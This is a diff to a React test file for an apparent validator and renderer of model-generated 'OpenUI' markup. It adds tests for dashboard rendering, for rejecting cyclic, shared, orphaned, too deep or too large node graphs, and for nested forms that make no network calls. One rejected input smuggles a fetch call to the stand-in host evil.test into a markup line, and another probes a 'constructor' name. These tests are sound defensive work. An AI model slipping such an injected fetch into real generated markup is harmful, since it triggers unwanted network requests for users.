@@ -7,6 +7,8 @@ import { ChatTranscript } from '../src/client/ChatTranscript';
 import { OpenUIBoundary } from '../src/client/OpenUIBoundary';
 import {
   OPENUI_MAX_LENGTH,
+  OPENUI_MAX_NODES,
+  OPENUI_MAX_DEPTH,
   openUIActionDraft,
   openUIRequested,
   validateOpenUI,
@@ -27,6 +29,77 @@ afterEach(async () => {
 });
 
 describe('OpenUI boundary', () => {
+  it('renders a dashboard with KPI rows, nested stage panels and mixed-case references', () => {
+    const stages = Array.from(
+      { length: 5 },
+      (_, i) =>
+        `s${i} = Panel("Stage ${i}", [t${i}])\nt${i} = Table(["Deal", "Status"],\n[["Sample ${i}", "Unconfirmed"]])`,
+    ).join('\n');
+    const metrics = Array.from(
+      { length: 6 },
+      (_, i) => `k${i} = Metric("Metric ${i}", "${i}")`,
+    ).join('\n');
+    const risks = Array.from(
+      { length: 5 },
+      (_, i) => `r${i} = Text("Risk ${i}")`,
+    ).join('\n');
+    const dashboard = `root = Panel("Pipeline dashboard", [note, kpis, s0, s1, s2, s3, s4, timeline, chartPanel, risks, footer])
+note = Text("Sample data only")
+kpis = Row([k0, k1, k2, k3, k4, k5])
+${metrics}
+${stages}
+timeline = Table(["Milestone", "Basis"], [["Next year", "Unconfirmed"]])
+chartPanel = Panel("${'Long chart context '.repeat(12)}", [bars])
+bars = BarChart(["A", "B"], [3, 5])
+risks = Panel("Risk flags", [r0, r1, r2, r3, r4])
+${risks}
+footer = Text("View only")`;
+    const safe = validateOpenUI(dashboard);
+    expect(safe.source.split('\n')).toHaveLength(29);
+    const parsed = createParser(
+      openUILibrary.toJSONSchema(),
+      openUILibrary.root,
+    ).parse(safe.source);
+    expect(parsed.meta.errors).toEqual([]);
+    expect(parsed.meta.unresolved).toEqual([]);
+    const html = renderToStaticMarkup(
+      <OpenUIBlock source={dashboard} disabled={true} />,
+    );
+    expect(html).toContain('class="openui-row"');
+    expect(html).toContain('<h3>Stage 4</h3>');
+    expect(html).toContain('<td>Sample 4</td>');
+    expect(html).toContain('Risk 4');
+    expect(html).not.toContain('Original response:');
+  });
+  it.each([
+    'root = Row([a])\na = Text("x")',
+    'root = Panel("X", [a])\na = Row([root])',
+    'root = Panel("X", [a])\na = Row([b])\nb = Panel("Cycle", [a])',
+    'root = Panel("X", [a, b])\na = Row([c])\nb = Row([c])\nc = Text("shared")',
+    'root = Panel("X", [a])\na = Row([missing])',
+    'root = Panel("X", [a])\na = Row([Text("inline")])',
+    'root = Panel("X", [a])\na = Row([b,,])\nb = Text("x")',
+    'root = Panel("X", [a])\na = Row([b])\nb = Text("x")\norphan = Text("unused")',
+    'root = Panel("X", [constructor])\nconstructor = Text("x")',
+    'root = Panel("X", [a])\na = Row([b]); fetch("https://evil.test")\nb = Text("x")',
+    'root = Panel("X", [a])\na = Row([' +
+      Array.from({ length: 25 }, (_, i) => `x${i}`).join(',') +
+      '])\n' +
+      Array.from({ length: 25 }, (_, i) => `x${i} = Text("x")`).join('\n'),
+    'root = Panel("X", [a0])\n' +
+      Array.from(
+        { length: OPENUI_MAX_DEPTH },
+        (_, i) => `a${i} = Row([a${i + 1}])`,
+      ).join('\n') +
+      `\na${OPENUI_MAX_DEPTH} = Text("too deep")`,
+    'root = Panel("X", [a0])\n' +
+      Array.from(
+        { length: OPENUI_MAX_NODES },
+        (_, i) => `a${i} = Text("too many")`,
+      ).join('\n'),
+  ])('rejects unsafe or excessive container graphs', (bad) => {
+    expect(() => validateOpenUI(bad)).toThrow();
+  });
   it('normalizes multiline model-generated tables before invoking the renderer', () => {
     const multiline = `root = Panel("Pipeline snapshot", [note, deals, bars])
 note = Text("Illustrative only; actual revenue is not potential revenue.")
@@ -270,36 +343,49 @@ bars = BarChart(
     expect(off).toContain('language-openui');
     expect(off).not.toContain('openui-surface');
   });
-  it('prepares current form values without network calls and blocks disabled actions', async () => {
-    const fetch = vi
-      .spyOn(globalThis, 'fetch')
-      .mockRejectedValue(new Error('Unexpected network'));
-    const onDraft = vi.fn();
-    let root!: ReactTestRenderer;
-    await act(async () => {
-      root = create(
-        <OpenUIBlock source={source} disabled={false} onDraft={onDraft} />,
+  it.each([
+    source,
+    'root = Panel("Nested form", [formRow])\nformRow = Row([innerPanel])\n' +
+      source.replace('root =', 'innerPanel ='),
+  ])(
+    'prepares flat or nested form values without network calls and blocks disabled actions',
+    async (formSource) => {
+      const fetch = vi
+        .spyOn(globalThis, 'fetch')
+        .mockRejectedValue(new Error('Unexpected network'));
+      const onDraft = vi.fn();
+      let root!: ReactTestRenderer;
+      await act(async () => {
+        root = create(
+          <OpenUIBlock
+            source={formSource}
+            disabled={false}
+            onDraft={onDraft}
+          />,
+        );
+      });
+      roots.push(root);
+      await act(async () => {
+        root.root
+          .findByType('input')
+          .props.onChange({ target: { value: 'Edited note' } });
+        root.root
+          .findByType('select')
+          .props.onChange({ target: { value: 'B' } });
+      });
+      await act(async () => root.root.findByType('button').props.onClick());
+      expect(onDraft).toHaveBeenCalledTimes(1);
+      expect(onDraft.mock.calls[0][0]).toContain('Edited note');
+      expect(onDraft.mock.calls[0][0]).toContain('"value":"B"');
+      expect(fetch).not.toHaveBeenCalled();
+      await act(async () =>
+        root.update(
+          <OpenUIBlock source={formSource} disabled={true} onDraft={onDraft} />,
+        ),
       );
-    });
-    roots.push(root);
-    await act(async () => {
-      root.root
-        .findByType('input')
-        .props.onChange({ target: { value: 'Edited note' } });
-      root.root.findByType('select').props.onChange({ target: { value: 'B' } });
-    });
-    await act(async () => root.root.findByType('button').props.onClick());
-    expect(onDraft).toHaveBeenCalledTimes(1);
-    expect(onDraft.mock.calls[0][0]).toContain('Edited note');
-    expect(onDraft.mock.calls[0][0]).toContain('"value":"B"');
-    expect(fetch).not.toHaveBeenCalled();
-    await act(async () =>
-      root.update(
-        <OpenUIBlock source={source} disabled={true} onDraft={onDraft} />,
-      ),
-    );
-    await act(async () => root.root.findByType('button').props.onClick());
-    expect(onDraft).toHaveBeenCalledTimes(1);
-    expect(root.root.findByType('fieldset').props.disabled).toBe(true);
-  });
+      await act(async () => root.root.findByType('button').props.onClick());
+      expect(onDraft).toHaveBeenCalledTimes(1);
+      expect(root.root.findByType('fieldset').props.disabled).toBe(true);
+    },
+  );
 });
